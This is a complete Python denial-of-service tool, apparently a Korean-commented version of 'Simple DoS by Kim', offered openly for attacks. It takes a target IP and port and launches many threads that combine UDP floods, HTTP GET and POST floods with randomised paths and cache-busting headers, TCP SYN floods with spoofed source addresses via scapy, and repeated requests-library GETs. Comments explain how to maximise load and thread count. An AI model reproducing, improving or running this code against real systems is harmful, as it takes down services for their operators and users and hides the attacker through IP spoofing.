import socket
import threading
import random
import os
import colorama
import requests
from scapy.all import IP, TCP, RandShort, send
from colorama import Fore
import logging
import sys
from time import sleep
from urllib.parse import urlparse # URL 파싱을 위해 추가

# 로깅 설정 (오류 발생 시 콘솔에 출력)
logging.basicConfig(stream=sys.stdout, level=logging.ERROR)

fake_ips = [
    '192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5',
    '192.143.2.2', '188.142.41.4', '187.122.12.1', '192.153.4.4',
    '192.154.32.4', '192.153.53.25', '192.154.54.5', '192.143.43.4',
    '192.165.6.9', '188.154.54.3', '10.0.0.1', '172.16.0.1', # 더 많은 가짜 IP 추가
    '203.0.113.1', '198.51.100.1', '0.0.0.0' # 더 다양한 범위의 IP 추가
]

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36', # 모바일 UA 추가
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1', # 아이폰 UA 추가
]

# 로고는 변경 없음
logo = r"""
╔══════════════════
║   Simple DoS by Kim
║   V : 2.1.1
║   MADE BY GNDFR
║   Enjoy your DoS attack :)
╚══════════════════
"""

def clear_screen() -> None:
    os.system('clear' if os.name == 'posix' else 'cls')

def flood_target(target_ip: str, target_port: int, effective_bps: int) -> None:
    while True:
        try:
            # 1. UDP Flood (페이로드 크기 증대)
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
                # 1472 bytes는 이더넷 MTU에서 UDP 헤더를 뺀 최대 안전 크기 (약 1500 - 28)
                # 더 큰 패킷은 IP 단편화를 유발하여 부하를 높일 수 있음
                payload = random._urandom(1472) 
                for _ in range(effective_bps // 1472 + 1): # BPS에 맞춰 패킷 수 조절
                    udp_socket.sendto(payload, (target_ip, target_port))
            
            # 2. HTTP GET/POST Flood (지속적인 연결, 다양한 경로, POST 요청 추가)
            try:
                # HTTP 소켓은 매번 새로 생성하여 연결이 끊어져도 복구 가능성을 높임
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as http_socket:
                    http_socket.settimeout(5) # 연결 타임아웃 설정
                    http_socket.connect((target_ip, target_port))
                    
                    # GET 요청 (다양한 경로와 캐시 무력화 헤더)
                    random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 15))) # 무작위 경로
                    http_get_request = (
                        f"GET {random_path} HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n"
                        f"User-Agent: {random.choice(user_agents)}\r\n"
                        f"Accept: */*\r\n"
                        f"Referer: http://{random.choice(fake_ips)}/{random_path}\r\n" # Referer 스푸핑
                        f"Cache-Control: no-cache\r\n" # 캐시 무력화
                        f"Pragma: no-cache\r\n" # 캐시 무력화
                        f"Connection: Keep-Alive\r\n\r\n"
                    ).encode()
                    http_socket.sendall(http_get_request)

                    # POST 요청 (큰 더미 데이터 포함)
                    post_data = os.urandom(random.randint(1024, 4096)) # 1KB ~ 4KB 랜덤 데이터
                    http_post_request = (
                        f"POST /submit HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n"
                        f"User-Agent: {random.choice(user_agents)}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(post_data)}\r\n"
                        f"Connection: Keep-Alive\r\n\r\n"
                    ).encode() + post_data
                    http_socket.sendall(http_post_request)
                    
            except (ConnectionRefusedError, TimeoutError, OSError, socket.timeout) as e:
                logging.error(f"[HTTP] Connection/Socket error: {e}")
            
            # 3. TCP SYN Flood (가짜 IP 사용)
            try:
                # Scapy를 통해 소스 IP 스푸핑
                src_ip = random.choice(fake_ips)
                packet = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
                send(packet, verbose=False)
            except PermissionError:
                logging.error("[TCP SYN] Permission denied. Run as root/admin for IP spoofing.")
            except Exception as e:
                logging.error(f"[TCP SYN] Scapy error: {e}")

            # 4. requests GET (URL 구조 다양화 및 Session 사용)
            try:
                # requests.Session을 사용하여 TCP 연결 재사용 최적화
                with requests.Session() as session:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Host': target_ip,
                        'Referer': f"http://{random.choice(fake_ips)}/{random_path}",
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache'
                    }
                    # 타겟이 URL이 아닐 경우, 'http://'를 붙여 유효한 URL로 만듦
                    target_url = f"http://{target_ip}:{target_port}"
                    session.get(target_url, headers=headers, timeout=5, verify=False) # SSL 검증 비활성화 추가
            except requests.exceptions.RequestException as e:
                logging.error(f"[Requests] HTTP GET error: {e}")

            sleep(0.0001) # 대기 시간을 더 줄여 전송 빈도 극대화
        except socket.gaierror:
            logging.error("[!] Fail get target info, did you type the target correct? [!]")
            break
        except KeyboardInterrupt:
            print(Fore.LIGHTRED_EX + "\nAttack stopped by user.")
            break
        except Exception as e:
            logging.error(f"[FLOOD] An unexpected error occurred: {e}")
            sleep(1)

def main() -> None:
    clear_screen()
    print(Fore.LIGHTMAGENTA_EX + logo)

    try:
        target_ip = input("\033[1;37mIP Target : ")
        target_port = int(input("Port : "))
        bytes_per_sec = int(input("Bytes Per Sec : "))
        thread_count_str = input("Thread (0 입력 시 시스템 최대치 사용) : ")
        use_boost = input("Use Boost ? Y/N : ").strip().lower()

        if thread_count_str.strip() == '0':
            thread_count = os.cpu_count() * 100 # 시스템 CPU 코어 수의 100배로 설정 (매우 공격적)
            if thread_count < 1000: # 최소 스레드 보장
                thread_count = 1000
            print(f"자동으로 스레드 수를 {thread_count}로 설정합니다.")
        else:
            thread_count = int(thread_count_str)


        effective_bps = bytes_per_sec + 500 if use_boost == 'y' else bytes_per_sec

        clear_screen()
        print(Fore.LIGHTMAGENTA_EX + logo)
        print(Fore.LIGHTRED_EX + "Attacking...")
        print(Fore.LIGHTWHITE_EX + "ATTACK STATUS: ")
        print("╔═════════════════")
        print(f"║ IP    : {target_ip}")
        print(f"║ Port  : {target_port}")
        print(f"║ BPS   : {bytes_per_sec}")
        print(f"║ Thrds : {thread_count}")
        print(f"║ Boost : {use_boost.upper()}")
        print("╚═════════════════")

        threads = [
            threading.Thread(target=flood_target, args=(target_ip, target_port, effective_bps), daemon=True)
            for _ in range(thread_count)
        ]

        for t in threads:
            t.start()

        # 무한 루프를 통해 공격을 계속 진행하고, 메인 스레드는 KeyboardInterrupt를 감지
        while True:
            sleep(1) # 메인 스레드에서 주기적으로 대기하며 Ctrl+C를 감지
            if not any(t.is_alive() for t in threads): # 모든 스레드가 종료되면 메인 스레드도 종료
                break

    except ValueError:
        print(Fore.LIGHTRED_EX + "[!] Invalid input. Port and thread count must be integers. [!]")
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + "\nScript stopped by user.")
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] An unexpected error occurred: {e} [!]")
    finally:
        print(Fore.LIGHTWHITE_EX + "\nExiting...")

if __name__ == "__main__":
    main()
